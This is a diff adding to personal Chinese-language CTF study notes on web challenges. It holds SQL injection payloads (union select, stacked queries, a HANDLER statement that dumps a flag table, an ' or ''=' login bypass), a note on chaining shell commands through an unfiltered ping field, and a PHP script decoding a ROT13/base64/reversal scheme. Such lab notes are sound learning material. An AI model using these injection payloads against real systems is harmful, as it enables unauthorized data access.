@@ -10,7 +10,7 @@ repeater go
 弱类型比较
 $a==$b等于
 $a===$b全等
-3.robot
+3.robot协议
 url后输入/robots.txt
 4.ping没写waf
 command1 && command2 先执行 command1，如果为真，再执行command2 
@@ -112,3 +112,57 @@ echo base64_encode($flag);   //对参数进行base编码
 5.inget（sql注入）
 构造payload 
 先尝试万能密码id=' or ''='直接给了flag
+2026.1.11
+1.sql注入（supersqli）
+首先提交表单，出现提示
+暴库 index.php?inject=1';and union select 1,2,3,4 %23
+index.php?inject=1';show database %23
+尝试堆叠注入 爆表： show tables 23% 出现表名1919810931114514
+爆列查看表 出现flag提示
+根据关键字handler，使用handler语句  /index.php?inject=1';handler `1919810931114514`open;handler `1919810931114514`read first %23
+#思路：爆字段，爆库名，表名，列名，找到flag
+2.逆向加密算法
+要将一串乱码解密
+分析代码加密逻辑编译解密程序：
+循环开始：给encode一个参数 $str
+将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 $_o
+循环遍历 变量 $_o
+在for循环中首先依次取字符串 $_o 的第 $_0 个值，赋值给 $_c
+将变量 $c 转化为 ASCII码 并 +1，赋值给 $_
+将 $__ 转化为该ASCII码所对应的字符，赋值给 $_c
+拼接字符串，赋值给 $_ , 循环结束。
+将拼接好后的字符串 $_ 进行 base64编码
+将编码后的值进行反转字符串操作
+对反转后的字符串进行 rot13 加密
+得出结果为 $miwen
+其中用到的php函数：
+strrev(string): 反转字符串
+strlen(string): 返回字符串的长度
+substr(string, start, length): 返回字符串的一部分
+string: 所需要的字符串
+start: 在字符串何处开始
+length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾
+ord(string): 返回字符串首个字符的 ASCII 值
+chr(): 从指定的 ASCII 值返回对应的字符
+str_rot13(string): 对字符串执行 ROT13 编码。
+ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变
+编码和解码都是由该函数完成的。如果把已编码的字符串作为参数，那么将返回原始字符串
+base64_encode(string): 使用 MIME base64 对数据进行编码
+<?php 
+   $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"; 
+   function decode($miwen){ 
+        $_o=base64_decode(strrev(str_rot13($miwen))); 
+        //echo $_o; 
+        for($_0=0;$_0<strlen($_o);$_0++) 
+        { 
+            $_c=substr($_o,$_0,1); 
+            $__=ord($_c)-1; 
+            $_c=chr($__); 
+            $_=$_.$_c; 
+        } 
+        return strrev($_);  
+        
+   } 
+   echo decode($miwen);     
+?> 
+运行得到flag
